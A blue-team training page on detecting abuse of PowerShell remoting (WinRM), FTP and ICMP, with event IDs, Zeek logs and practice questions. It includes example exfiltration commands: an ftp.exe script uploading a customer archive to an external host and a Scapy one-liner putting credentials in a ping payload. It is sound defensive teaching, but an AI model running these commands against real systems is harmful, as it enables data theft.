---
title: "PowerShell Remoting (WinRM), FTP and Malicious ICMP"
tags:
  - training
  - blue-team
  - network
  - winrm
  - powershell
  - ftp
  - icmp
  - exfiltration
  - lateral-movement
---

# PowerShell Remoting (WinRM), FTP and Malicious ICMP { #psremoting-ftp-icmp }

!!! abstract "What this page covers"
    Three protocols that look nothing alike but share one trait: each is a quiet way to **move sideways or move data out**. First PowerShell remoting — "SSH for Windows" built as a stack of PSRP → WinRM (WSMV) → SOAP → HTTP(S) on ports **5985/5986** — shown as real `Enter-PSSession`/`Invoke-Command` commands, what it looks like on the wire (`POST /wsman`, `multipart/encrypted`), and the traces it leaves on both ends (WinRM 6/91, `wsmprovhost.exe`, 4624 type 3, PowerShell 400/4103/4104, service 7040). Then FTP: why a dying, unencrypted protocol is still an exfiltration path, a control-channel session read line by line, Zeek `ftp.log`, and Windows' built-in `ftp.exe -s:`. Finally ICMP: how a ping packet can carry up to 65,507 bytes of anything, what normal Windows and Linux ping payloads look like, a crafted payload in hex, and how to spot ICMP tunnels. Practice questions with explanations at the end.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts and IPs are invented for illustration (`.example`, documentation and private IPs).

## The 8 key points { #key-points }

1. **PowerShell remoting** gives an interactive or scripted PowerShell session on a remote Windows machine. The result feels like SSH, but underneath it is a **web service**: PSRP messages, carried by WinRM (Microsoft's WS-Management, "WSMV"), encoded as SOAP XML, sent in HTTP(S) `POST` requests.
2. WinRM listens on **TCP 5985 (HTTP)** and **5986 (HTTPS)**. It is **on by default on Windows Server** and **off on Windows desktops**. Traffic on these ports is an easy way to see one machine controlling another.
3. Because it is a full remote-management framework, attackers use it for **lateral movement, remote execution and backdoors**, with stolen admin credentials and no extra tools.
4. Defend it the same way as SSH: **decide which sources may remote into which destinations**, enforce that with firewall scope, and **alert on anything outside it** — plus watch for the WinRM service being switched on where it shouldn't be.
5. On the target, PowerShell remoting leaves a clear pattern: **4624 logon type 3**, WinRM event **91**, a **`wsmprovhost.exe`** process that becomes the parent of whatever the attacker runs, and PowerShell logs **400 (HostName=ServerRemoteHost)**, **4103/4104**.
6. **FTP** (TCP 21 control, plus separate data connections) is old, **unencrypted** and fading. It matters to defenders because it is useful at several attack stages: **exploiting old FTP servers**, **staging stolen data internally**, **sniffing passwords**, **tampering with files**, and **exfiltration** through firewalls that still allow it.
7. If your network doesn't use FTP, **any FTP is an alert**. If it does, allow-list the known flows and alert on the rest — **inside the network too**, not only at the perimeter.
8. **ICMP** packets have a payload field that can hold **arbitrary data** — up to **65,507 bytes** per packet. With a packet-crafting tool, an attacker can smuggle stolen data or C2 inside "pings". The giveaway is that the payload, size or volume doesn't match what real `ping` produces.

## PowerShell remoting (WinRM) { #psremoting }

### Why it exists { #psremoting-why }

Linux administrators have always had SSH: one command and you are typing on the remote machine. Windows didn't have that for a long time. Remote Desktop gives a whole screen, which is heavy and hard to script, and tools like PsExec work over SMB by creating a service. Microsoft's answer was **Windows Remote Management (WinRM)** — its implementation of the open **WS-Management** standard (the `winrm` command and the `WinRM` service) — and, on top of it, **PowerShell remoting**.

An analogy: SSH is a private phone line between two machines. PowerShell remoting is more like **sending letters through a web form**: every command is written up as a structured XML document, put in an HTTP `POST`, and handed to a small web service on the other side, which runs it and posts back the results. The experience is the same — you type, the remote machine answers — but the plumbing is completely different.

### The protocol stack, layer by layer { #psremoting-stack }

```
PowerShell Remoting Protocol (PSRP)     ← PowerShell objects, pipelines, commands
WinRM / WSMV (WS-Management for Windows) ← "create shell", "send input", "receive output"
SOAP (XML envelopes)                    ← the message format
HTTP  (TCP 5985)  or  HTTPS (TCP 5986)  ← the transport
TCP / IP
```

- **PSRP** — the top layer. It knows about PowerShell things: runspaces, pipelines, serialized objects.
- **WSMV** — Microsoft's extended version of WS-Management (the name comes from "WS-Management extensions for Windows Vista", the release it shipped with). It provides generic operations like *Create* (open a shell), *Command*, *Send*, *Receive* and *Delete*.
- **SOAP** — each operation is an XML "envelope" with a header (where it's going, what action) and a body (the data).
- **HTTP(S)** — the envelope rides in the body of an HTTP `POST` to the path `/wsman`.

The practical meaning for a defender: on the remote side, **a web listener (the WinRM service, via `HTTP.sys`) is waiting for connections**, and remote commands arrive as web requests. That is why WinRM traffic looks like web traffic — except on ports 5985/5986 instead of 80/443.

[Supplement] PowerShell 7 (and 6 before it) can also do remoting **over SSH** instead of WinRM (`Enter-PSSession -HostName … -SSHTransport`, or `-HostName` with `-UserName`). That traffic goes to port 22 and looks like any other SSH session — everything on the [SSH page](ssh-rdp-vnc.md) applies.

### What using it looks like { #psremoting-commands }

An administrator (or an attacker with an administrator's password) on `ws-admin-0004`:

```
PS C:\> Test-WSMan -ComputerName srv-app-0007

wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd
ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd
ProductVendor   : Microsoft Corporation
ProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 3.0
```

- `Test-WSMan` — asks "is a WinRM listener answering on this host?" Any answer means the service is reachable on 5985. Attackers run the same check to find targets.
- `Stack: 3.0` — the WS-Management stack version used by all current Windows versions.

```
PS C:\> Enter-PSSession -ComputerName srv-app-0007 -Credential CORP\svc-deploy
[srv-app-0007]: PS C:\Users\svc-deploy\Documents> whoami
corp\svc-deploy
[srv-app-0007]: PS C:\Users\svc-deploy\Documents> exit
```

- `Enter-PSSession` — opens an **interactive** remote session (the SSH-like experience).
- `-ComputerName srv-app-0007` — the target. By default this means WinRM over HTTP to port 5985, authenticated with **Kerberos** (domain).
- `-Credential CORP\svc-deploy` — use this account instead of the current user (prompts for the password).
- The prompt changes to `[srv-app-0007]: PS …` — everything typed now runs on the remote server.

```
PS C:\> Invoke-Command -ComputerName srv-app-0007,srv-app-0008 -ScriptBlock { Get-Process lsass }

 NPM(K)    PM(M)      WS(M)     CPU(s)      Id  SI ProcessName   PSComputerName
 ------    -----      -----     ------      --  -- -----------   --------------
     31     9.84      22.41       4.27     712   0 lsass         srv-app-0007
     29     9.12      21.07       3.90     704   0 lsass         srv-app-0008
```

- `Invoke-Command` — runs a script block on one **or many** machines at once, with no interactive prompt. This is what makes remoting powerful for admins — and for attackers who want to run the same thing on 50 servers.
- `PSComputerName` — PowerShell adds this column so you can see which host each result came from.

Other ways into the same service: `winrs -r:srv-app-0007 cmd` (Windows Remote Shell, which shows up as `winrshost.exe` on the target), WMI over WinRM, and attacker tools such as the open-source **Evil-WinRM** client, which runs from Linux.

### What it looks like on the wire { #psremoting-wire }

```
POST /wsman HTTP/1.1
Connection: Keep-Alive
Content-Type: multipart/encrypted;protocol="application/HTTP-Kerberos-session-encrypted";boundary="Encrypted Boundary"
User-Agent: Microsoft WinRM Client
Content-Length: 1650
Host: srv-app-0007:5985
```

- `POST /wsman` — the WS-Management endpoint. Nearly all WinRM traffic is POSTs to this one path.
- `Content-Type: multipart/encrypted; … Kerberos-session-encrypted` — **the SOAP body is encrypted** with the Kerberos session key, even though the transport is plain HTTP. (With NTLM it says `HTTP-SPNEGO-session-encrypted`.)
- `User-Agent: Microsoft WinRM Client` — the built-in Windows client. A different user agent (for example a Ruby or Python library) on 5985 points to a non-Windows client like Evil-WinRM.
- `Host: srv-app-0007:5985` — the port that gives it away.

[Correction] "WinRM on port 5985 is cleartext, so the network sensor can read the commands" is usually wrong. By default the client and server refuse unencrypted messages (`AllowUnencrypted = false`), so with Kerberos or NTLM the body is encrypted at the message level. Your sensor sees *that* a session happened, its size and timing — not the commands. Only Basic authentication over HTTP is truly cleartext, and it is off by default.

A Zeek `conn.log` line for a remoting session:

```
ts=2026-11-19T03:12:40Z uid=CwR9m2 id.orig_h=10.20.30.41 id.orig_p=50114 id.resp_h=10.20.0.37 id.resp_p=5985 proto=tcp service=http duration=412.6 orig_bytes=188214 resp_bytes=903377 conn_state=SF
```

- `10.20.30.41 → 10.20.0.37:5985` — a **user workstation** remoting into a server. Admin remoting should come from jump hosts or admin workstations.
- `service=http` — Zeek recognises the HTTP even on a non-web port. `http.log` will show `method=POST uri=/wsman user_agent=Microsoft WinRM Client`.
- `03:12` and ~7 minutes — an interactive session in the middle of the night.

### Who can use it, and when it's on { #psremoting-defaults }

- **Windows Server:** WinRM is **enabled by default** (since Server 2012), with an HTTP listener on 5985 and a firewall rule allowing it — so servers are ready to be remoted into.
- **Windows desktops:** **off by default.** Someone has to run `Enable-PSRemoting` (or `winrm quickconfig`), or push it by Group Policy.
- **Who may connect:** by default only members of the local **Administrators** group and **Remote Management Users**. So remoting needs **admin (or delegated) credentials** — which attackers obtain from [credential dumping](../../../adversary/lsass-dumping.md).
- **Domain vs workgroup:** in a domain, Kerberos makes it just work. Between workgroup machines it needs extra setup (HTTPS, or adding the target to the client's `TrustedHosts` list and using NTLM). A `TrustedHosts` value of `*` on a client is a red flag.

To see the listener on a host:

```
PS C:\> winrm enumerate winrm/config/listener
Listener
    Address = *
    Transport = HTTP
    Port = 5985
    Enabled = true
    URLPrefix = wsman
    ListeningOn = 10.20.0.37, 127.0.0.1, ::1
```

- `Transport = HTTP`, `Port = 5985` — the default listener. A `Transport = HTTPS` listener on 5986 would also show a `CertificateThumbprint`.
- `Address = *` — listening on all interfaces.

### The traces it leaves { #psremoting-traces }

**On the source (`ws-admin-0004` or the compromised PC):**

```
Microsoft-Windows-WinRM/Operational  Event ID 6
Creating WSMan Session. The connection string is: srv-app-0007/wsman?PSVersion=5.1.22621.4391
```

- **WinRM 6** — "a WS-Management session is being created" on the **client**. The connection string names the **destination**. This is how you prove which hosts a compromised machine remoted into.
- Also: Sysmon 1 / 4688 for `powershell.exe` with `Enter-PSSession`/`Invoke-Command`, and Sysmon 3 for a connection to port 5985.

**On the target (`srv-app-0007`):**

```
Security 4624   An account was successfully logged on
Logon Type:             3
Account Name:           svc-deploy        Account Domain: CORP
Source Network Address: 10.20.30.41
Authentication Package: Kerberos

Microsoft-Windows-WinRM/Operational  Event ID 91
Creating WSMan shell on server with ResourceUri: http://schemas.microsoft.com/powershell/Microsoft.PowerShell

Sysmon 1   Process Create
Image:       C:\Windows\System32\wsmprovhost.exe
CommandLine: C:\Windows\system32\wsmprovhost.exe -Embedding
User:        CORP\svc-deploy

Sysmon 1   Process Create
Image:       C:\Windows\System32\cmd.exe
CommandLine: "C:\Windows\system32\cmd.exe" /c net group "Domain Admins" /domain
ParentImage: C:\Windows\System32\wsmprovhost.exe

Windows PowerShell  Event ID 400
Engine state is changed from None to Available.
    HostName=ServerRemoteHost
```

- **4624 type 3** — a **network** logon (not type 10 like RDP). Remoting uses the account's credentials over the network, so you see type 3 from the source IP. `4672` (special privileges) usually follows for admins.
- **WinRM 91** — the **server** side created a shell. `ResourceUri … Microsoft.PowerShell` = a PowerShell remoting session (a `…/windows/shell/cmd` URI means `winrs`).
- **`wsmprovhost.exe`** — the host process that runs the remote PowerShell session on the target. **Anything it spawns was run remotely.** `wsmprovhost.exe → cmd.exe → net group "Domain Admins"` is a remote attacker doing reconnaissance. (For `winrs`, the parent is `winrshost.exe`.)
- **PowerShell 400 with `HostName=ServerRemoteHost`** — a PowerShell engine started *because of a remote session*. Locally started PowerShell shows `ConsoleHost`.
- **4103/4104** (Microsoft-Windows-PowerShell/Operational) — module logging and **script block logging** record the actual commands that ran, even though they were encrypted on the wire. Turn script block logging on everywhere; this is where you recover what the attacker typed.

**Remoting being switched on where it shouldn't be:**

```
System  Service Control Manager  Event ID 7040
The start type of the Windows Remote Management (WS-Management) service was changed from demand start to auto start.

System  Service Control Manager  Event ID 7036
The Windows Remote Management (WS-Management) service entered the running state.
```

- **7040** — a service's start type changed. On a **workstation**, WinRM changing to auto start means someone ran `Enable-PSRemoting` — fine if IT did it, a backdoor if not.
- **7036** — the service started. Pair it with a new firewall rule for 5985 and a new listener.

### Detecting and limiting it { #psremoting-defence }

- **Define the allowed paths:** "admin jump hosts in `10.20.5.0/24` may remote into servers; nothing else may." Enforce it with the WinRM firewall rule's **remote address scope** and network ACLs.
- **Alert on everything outside them:** any 5985/5986 between workstations, from a user subnet to servers, or to/from the internet; WinRM 91 / `wsmprovhost.exe` on a host where the source isn't an admin host.
- **Watch the child processes** of `wsmprovhost.exe` and `winrshost.exe` — recon commands, `rundll32`, encoded PowerShell ([download cradles](../../../adversary/powershell-cradles.md)).
- **Watch activation:** 7040/7036 for WinRM on workstations, `TrustedHosts` changed to `*`, `AllowUnencrypted`/Basic auth turned on.
- **Reduce who can use it:** keep Administrators and Remote Management Users small; consider JEA (Just Enough Administration) endpoints that only allow specific commands.

The same rule applies to SSH: decide the allowed source and destination subnets, and alert on any use outside them. More technique detail: [WMI and WinRM](../../../adversary/wmi-winrm.md).

## FTP — File Transfer Protocol { #ftp }

### Why an old protocol still matters { #ftp-why }

FTP is one of the oldest internet protocols, from long before encryption was normal. Most file transfer has moved to HTTPS and SFTP; both Chrome and Firefox removed FTP support in 2021 because almost nobody used it. But FTP servers and clients are still around — in old business systems, devices, printers and scanners, and file drops left over from years ago.

For an analyst, FTP is interesting because it helps an attacker at **several stages**:

- **Initial access / exploitation.** Many FTP server packages are old and unpatched, with known remote-code-execution and authentication bugs.
- **Credential theft.** The username and password cross the network in **cleartext**. Anyone sniffing the path can read them, and they are often reused elsewhere.
- **Tampering.** The data is also unencrypted and unauthenticated, so a file in transit can be changed without either side noticing.
- **Internal staging.** An internal FTP server is a convenient place to collect stolen data before sending it out.
- **Exfiltration.** It is a well-known protocol that some firewalls still allow, designed to move large files — an ideal path for bulk data out. In the well-known 2013 breach of a large US retailer, stolen card data was reportedly collected on an internal server and sent out over FTP.

Analogy: FTP is sending your files by **postcard**. Anyone who handles it can read it, and anyone can rewrite it. Technically: no TLS on port 21, and every command, password and file byte is visible in the packet capture.

### How an FTP session works { #ftp-how }

FTP uses **two connections**:

- a **control connection** to **TCP 21**, where commands and replies are exchanged as plain text lines;
- a separate **data connection** for each file or directory listing. In **passive mode** (the usual one today) the server tells the client which high port to connect to; in **active mode** the server connects back to the client (from port 20).

A control-channel session from an internal server uploading an archive, as you'd see it with "Follow TCP Stream" in Wireshark (`C:` = client, `S:` = server):

```
S: 220 (vsFTPd 3.0.5)
C: USER drop
S: 331 Please specify the password.
C: PASS W1nter2026!
S: 230 Login successful.
C: TYPE I
S: 200 Switching to Binary mode.
C: EPSV
S: 229 Entering Extended Passive Mode (|||40417|)
C: STOR q4_customers.7z
S: 150 Ok to send data.
S: 226 Transfer complete.
C: QUIT
S: 221 Goodbye.
```

Line by line:

- `220 (vsFTPd 3.0.5)` — the server's greeting **banner**, often naming the software and version (useful for checking if it's vulnerable).
- `USER drop` / `331` — the client sends the username; the server asks for the password.
- `PASS W1nter2026!` — **the password in cleartext**. Anyone capturing this traffic now has it.
- `230 Login successful.` — logged in. (A `530 Login incorrect.` would be a failure; many of those from one source = password guessing.)
- `TYPE I` / `200` — binary ("image") mode, for non-text files such as archives.
- `EPSV` / `229 … (|||40417|)` — extended passive mode: "open your data connection to my port **40417**". (Older `PASV` replies look like `227 Entering Passive Mode (203,0,113,90,157,225)` — the last two numbers encode the port: 157×256+225 = 40417.)
- `STOR q4_customers.7z` — **upload** this file to the server. `RETR` would be a download. For exfiltration, `STOR` to an external server is the line that matters.
- `150` / `226 Transfer complete.` — the data started and finished on the separate connection.
- `QUIT` / `221` — end of session.

Zeek writes one `ftp.log` line per command that transfers something:

```
ts=2026-11-19T01:47:03Z uid=CfT7p0 id.orig_h=10.20.0.44 id.orig_p=51830 id.resp_h=203.0.113.90 id.resp_p=21 user=drop password=<hidden> command=STOR arg=ftp://203.0.113.90/./q4_customers.7z mime_type=application/x-7z-compressed file_size=1610612736 reply_code=226 reply_msg=Transfer complete. data_channel.passive=T data_channel.orig_h=10.20.0.44 data_channel.resp_h=203.0.113.90 data_channel.resp_p=40417
```

- `id.orig_h=10.20.0.44 → id.resp_h=203.0.113.90:21` — an internal server talking FTP to an **internet** host.
- `user=drop`, `password=<hidden>` — Zeek records the username; by default it hides passwords except for anonymous logins (the password is still in the raw pcap).
- `command=STOR`, `arg=…/q4_customers.7z` — an upload, and the file name.
- `mime_type=application/x-7z-compressed`, `file_size=1610612736` — about 1.5 GB of compressed archive. Archive + large size + outbound = classic staged exfiltration.
- `data_channel.*` — the separate data connection (passive, to port 40417). Its own `conn.log` line will show the ~1.5 GB of `orig_bytes`.

### Built into Windows, too { #ftp-lolbin }

Windows still ships a command-line FTP client, and attackers use it as a [living-off-the-land binary](../../../adversary/lolbins.md):

```
C:\> ftp -i -n -s:C:\ProgramData\u.txt 203.0.113.90
```

- `-s:C:\ProgramData\u.txt` — read the FTP commands from this file (a script: `user drop W1nter2026!`, `binary`, `put q4_customers.7z`, `bye`). No one has to type anything.
- `-i` — don't ask for confirmation for each file; `-n` — don't auto-login (the script supplies the `user` line).

In Sysmon 1 / 4688 this shows up as `ftp.exe` with `-s:` — rare on modern endpoints and worth an alert on its own. Also look for `curl.exe -T <file> ftp://…` (Windows' built-in curl can upload over FTP).

### What to do about FTP { #ftp-defence }

- **If you don't use FTP:** block it, and **alert on any FTP seen** — TCP 21, or anything Zeek or your firewall's application identification calls FTP on another port.
- **If you do:** list the legitimate flows (which client, which server, which account), exclude them in the analytic, and alert on everything else.
- **Look inside the network, not only at the edge.** Internal FTP is how data gets staged and how cleartext passwords leak across segments.
- **Replace it** with SFTP (FTP-like commands over SSH) or FTPS (FTP over TLS) where it is still needed, and patch or retire old FTP servers.

## Malicious ICMP { #icmp }

### Can a ping be evil? { #icmp-why }

ICMP (Internet Control Message Protocol) is the network's messaging system — "destination unreachable", "time exceeded" (which `traceroute` uses), and the famous **echo request (type 8)** and **echo reply (type 0)** that make up `ping`. Because it is "just ping", many networks let it through without a second look.

But an echo packet has a **data (payload) field**, and the protocol doesn't care what's in it. The receiver of an echo request simply copies the payload back into the reply. So:

- an attacker who can craft raw packets can fill the payload with **stolen data, passwords or commands**;
- the maximum payload is **65,507 bytes** per packet (65,535-byte maximum IP packet − 20-byte IP header − 8-byte ICMP header) — larger packets just get fragmented on the way;
- a small program on each end turns a stream of "pings" into a **covert channel** (ICMP tunnelling): data out in requests, commands back in replies.

Analogy: the payload is the blank back of a postcard that's only supposed to say "are you there?" Nobody reads the back — so you can write anything there.

### What normal ping looks like { #icmp-normal }

To spot a crafted payload, you need to know the normal ones. Using tshark (`-x` shows the bytes in hex):

**Windows `ping`** — 32 bytes, always the alphabet:

```
0000  61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70   abcdefghijklmnop
0010  71 72 73 74 75 76 77 61 62 63 64 65 66 67 68 69   qrstuvwabcdefghi
```

**Linux `ping`** — 56 bytes: a 16-byte timestamp (on 64-bit systems), then bytes counting up `10 11 12 … 37`:

```
0000  6f 5a 3c 69 00 00 00 00 a3 1c 0b 00 00 00 00 00   oZ<i............
0010  10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f   ................
0020  20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f    !"#$%&'()*+,-./
0030  30 31 32 33 34 35 36 37                           01234567
```

- Left column — offset into the payload. Middle — the bytes in hex. Right — the same bytes as text (`.` for unprintable).
- These patterns are fixed by the operating system's ping program. Monitoring tools and network devices also have their own recognisable patterns.

### A crafted payload { #icmp-crafted }

With a packet-crafting library like Scapy (Python), it takes one line to send an echo request with your own payload:

```
>>> send(IP(dst="203.0.113.50")/ICMP(type=8, id=0x1a2b, seq=1)/Raw(load=b"user=j.kim;pass=Autumn#22;host=srv-fin-0002"))
.
Sent 1 packets.
```

- `IP(dst="203.0.113.50")` — build an IP header to the attacker's host.
- `/ICMP(type=8, id=…, seq=1)` — stack an ICMP echo request on top (the `/` means "put this layer on top of the previous one").
- `/Raw(load=b"…")` — the payload: here, stolen credentials as text.
- `send(...)` — send it at the IP layer (needs administrator/root rights to create raw packets).

In Wireshark's packet list it looks perfectly normal:

```
No.  Time      Source        Destination    Protocol Length Info
412  9.204118  10.20.0.44    203.0.113.50   ICMP     85     Echo (ping) request  id=0x1a2b, seq=1/256, ttl=64 (no response found!)
```

Only the bytes show the truth:

```
0000  75 73 65 72 3d 6a 2e 6b 69 6d 3b 70 61 73 73 3d   user=j.kim;pass=
0010  41 75 74 75 6d 6e 23 32 32 3b 68 6f 73 74 3d 73   Autumn#22;host=s
0020  72 76 2d 66 69 6e 2d 30 30 30 32                  rv-fin-0002
```

Real tools usually compress or encrypt the data first, so instead of readable text you'd see random-looking bytes. That's still a signal: **normal ping payloads are predictable; high-entropy payloads are not normal.** Known ICMP tunnelling tools include ptunnel-ng, icmpsh and hans; some Linux backdoors (BPFDoor is a well-known example) don't even open a port — they sit and wait for a specially crafted "magic" packet, which can be ICMP, before they wake up.

### How to spot ICMP abuse { #icmp-detect }

Zeek logs ICMP "connections" in `conn.log`, with the ICMP **type** in `id.orig_p` and the **code** in `id.resp_p`:

```
ts=2026-11-19T02:05:11Z uid=CiC0x1 id.orig_h=10.20.0.44 id.orig_p=8 id.resp_h=203.0.113.50 id.resp_p=0 proto=icmp duration=3550.2 orig_pkts=41870 orig_bytes=41450112 resp_pkts=41870 resp_bytes=1339840 conn_state=OTH
```

- `proto=icmp`, `id.orig_p=8`, `id.resp_p=0` — echo request (type 8), code 0.
- `orig_pkts=41870` over `duration=3550.2` (~1 hour) — about 12 pings a second, for an hour, to one internet host. Normal ping is a handful of packets.
- `orig_bytes=41450112` — about 41 MB **out**, i.e. ~990 bytes per packet. Windows ping carries 32 data bytes, Linux 56.
- `resp_bytes=1339840` — ~32 bytes per reply. A normal echo reply carries **the same payload** as the request; replies that are different (here, much smaller) mean the other end is not a normal ping responder but a tunnel server.

What to watch:

- **Volume:** lots of ICMP to a single external host, or ICMP sessions lasting a long time.
- **Size:** echo payloads that aren't the usual 32/56 bytes (or your monitoring tool's known size), especially large ones.
- **Content:** payloads that aren't the OS pattern; high entropy; request and reply payloads that differ.
- **Who:** servers or workstations pinging the internet at all, when nothing in their role needs to.
- **Policy:** allow the ICMP types you need (internal monitoring, and "fragmentation needed" type 3 code 4 for path MTU discovery — don't block that one) and **block outbound echo to the internet** from hosts that don't need it.

The same thinking applies to any protocol with a field that can hold arbitrary data — DNS is the other classic ([DNS abuse](../dns/dns-abuse.md)).

## The 2026 view { #trends }

!!! success "[2026 Current] Still valid"
    Everything here still holds. PowerShell remoting is still built on WinRM and still listens on 5985/5986; it is still on by default on Windows Server and off on clients, and abusing it with stolen admin credentials (MITRE ATT&CK **T1021.006 Windows Remote Management**) is a routine part of hands-on-keyboard intrusions. The target-side pattern — 4624 type 3, WinRM 91, `wsmprovhost.exe` children, PowerShell 400 `ServerRemoteHost` and 4104 — is still how you find it, and defining allowed source/destination subnets is still the core control. FTP is still unencrypted and still turns up in exfiltration; "alert on any FTP if you don't use it" is still the right policy. ICMP still has a free-form payload, ICMP tunnels and ICMP-triggered backdoors are still reported in 2025–2026, and network detection products still ship dedicated ICMP-tunnel detections.

!!! info "[Changed] What has changed"
    - **Windows PowerShell 2.0 is gone.** Microsoft removed the PowerShell 2.0 engine from Windows 11 24H2 (August 2025) and Windows Server 2025 (September 2025). The old attacker trick `powershell.exe -version 2` — dropping to an engine that has no script block logging or AMSI — no longer works on those systems, which makes 4104 more trustworthy. Older systems still have it unless it was removed, so keep looking for `-version 2` / `-v 2` on them.
    - **PowerShell 7 remoting over SSH** is now common in mixed Windows/Linux estates. Remoting can therefore appear on port 22 rather than 5985 — watch both.
    - **Attacker tooling moved to off-the-shelf clients.** Evil-WinRM (from Linux) and remote-execution modules in common offensive frameworks talk WinRM directly. Their HTTP user agent and the source being a non-Windows host can differ from the built-in client.
    - **FTP has practically left the browser** (removed from Chrome and Firefox in 2021), and modern file-transfer attacks target managed file transfer *products* (MFT platforms) and their web interfaces more than plain FTP daemons. Exfiltration increasingly goes to cloud storage over HTTPS or with legitimate sync/transfer tools (rclone and similar), so FTP is now one exfil channel among several — watch for those too.
    - **ICMP covert channels are now aimed at stealthy backdoors** as much as bulk exfiltration — malware that listens passively and wakes on a crafted ICMP/UDP/TCP packet, used against Linux servers and network devices.

!!! warning "[Caution] Wrong or risky to do the old way"
    - **Don't assume a network sensor can read WinRM commands on 5985.** With Kerberos/NTLM the message body is encrypted. Get the commands from **4104 script block logging** on the target, and the "who connected where" from WinRM 6/91 and 4624.
    - **Don't "fix" WinRM security by allowing Basic auth or unencrypted traffic** (`AllowUnencrypted=true`) to make a tool work — that puts credentials and commands in cleartext. If you need HTTPS, use a 5986 listener with a proper certificate.
    - **Don't set `TrustedHosts` to `*`** on admin machines to get workgroup remoting working; it removes server identity checks.
    - **Don't watch FTP only at the perimeter.** Internal FTP is where staging and credential leaks happen.
    - **Don't block all ICMP.** Blocking "fragmentation needed" breaks path MTU discovery and causes mysterious connection hangs. Block outbound echo where not needed, and inspect what you allow.

## Practice questions { #quiz }

### Question 1

On server `srv-app-0007` you find: 4624 logon type 3 for `CORP\svc-deploy` from `10.20.30.41`, WinRM event 91, and Sysmon 1 showing `cmd.exe /c net group "Domain Admins" /domain` with parent `wsmprovhost.exe`. `10.20.30.41` is an ordinary user laptop. What happened, and which logs would you use to find (a) what else was run and (b) where else the attacker went?

??? success "Answer and explanation"
    **What happened:** someone used **PowerShell remoting** from the user laptop `10.20.30.41` into the server, with the `svc-deploy` credentials. 4624 type 3 is the network logon that remoting uses; WinRM 91 is the server creating a remote shell; and `wsmprovhost.exe` is the process that hosts the remote session, so anything it spawns — here a Domain Admins group lookup — was run remotely. Admin remoting should come from jump hosts, not a user laptop, so treat the laptop as compromised and `svc-deploy` as stolen.

    **(a) What else was run:** on `srv-app-0007`, PowerShell **4104** (script block logging) and **4103** for the commands themselves (the network traffic on 5985 was encrypted), PowerShell **400** with `HostName=ServerRemoteHost` for session start times, and every Sysmon 1 / 4688 with parent `wsmprovhost.exe`.

    **(b) Where else:** on the **laptop**, WinRM **6** events — their connection strings name each destination — plus Sysmon 3 connections to port 5985/5986. On the network, every `conn.log` line from `10.20.30.41` to 5985/5986. Across the estate, 4624 type 3 for `svc-deploy` from `10.20.30.41`.

### Question 2

Zeek shows `id.orig_h=10.20.0.44 id.resp_h=203.0.113.90 id.resp_p=21 user=drop command=STOR mime_type=application/x-7z-compressed file_size=1610612736`. Your organisation has no approved FTP. Explain each part, why it matters, and two other things FTP exposes even when it isn't used for exfiltration.

??? success "Answer and explanation"
    **Reading it:** an internal host (`10.20.0.44`) opened an FTP control connection to port 21 on an **internet** host (`203.0.113.90`), logged in as `drop`, and ran `STOR` — an **upload** — of a 7-Zip archive of about 1.5 GB. Compressed archive + large size + outbound + a protocol you don't use = data staged and **exfiltrated**. With no approved FTP, this should alert just because it's FTP; the details make it a probable incident. Next: what created the archive on `10.20.0.44` (process and file events), how the attacker got there, and block `203.0.113.90`.

    **Other exposures:** (1) **cleartext credentials** — `USER`/`PASS` cross the network unencrypted and can be sniffed (and reused elsewhere); (2) **tampering** — files in transit can be altered; and (3) **old, vulnerable FTP server software** that can be exploited for access. Also internal FTP servers as staging points.

### Question 3

A colleague says: "ICMP is just ping — there's no data in it, so we can allow it out to anywhere." Correct them, and describe two signs in `conn.log` or a packet capture that would reveal an ICMP tunnel.

??? success "Answer and explanation"
    **Correction:** ICMP echo packets have a payload field that can hold **anything**, up to 65,507 bytes per packet, and the receiver doesn't check it. With a crafting tool or an ICMP tunnelling program, an attacker can send stolen data out in echo requests and receive commands in replies. "Just ping" is a covert channel if you allow it unexamined to anywhere.

    **Signs:** (1) **Volume and duration** — thousands of echo requests to one external host over a long time (for example `orig_pkts=41870` over an hour), where normal ping is a few packets. (2) **Size and content** — payloads that aren't the OS's normal 32 bytes (Windows alphabet) or 56 bytes (Linux timestamp + counting bytes); large or high-entropy payloads; and **replies whose payload differs from the request**, which a real ping responder never does. Policy: block outbound echo from hosts that don't need it, but keep essential types like "fragmentation needed".

## Related { #related }

- [WMI and WinRM](../../../adversary/wmi-winrm.md) · [PowerShell download cradles](../../../adversary/powershell-cradles.md) · [PsExec and SMB lateral movement](../../../adversary/psexec-smb.md)
- [Living off the land binaries](../../../adversary/lolbins.md) · [LSASS dumping](../../../adversary/lsass-dumping.md)
- [DNS abuse](../dns/dns-abuse.md) — the other classic covert channel
- [Windows event IDs](../../../basics/windows-event-ids.md) · [Well-known ports](../../../basics/well-known-ports.md)
- [Zeek conn.log](../../../network/zeek/conn-log.md) · [Wireshark and tshark](../../../network/wireshark-tshark.md)
- [SMB](smb.md) · [SSH, RDP and VNC](ssh-rdp-vnc.md)
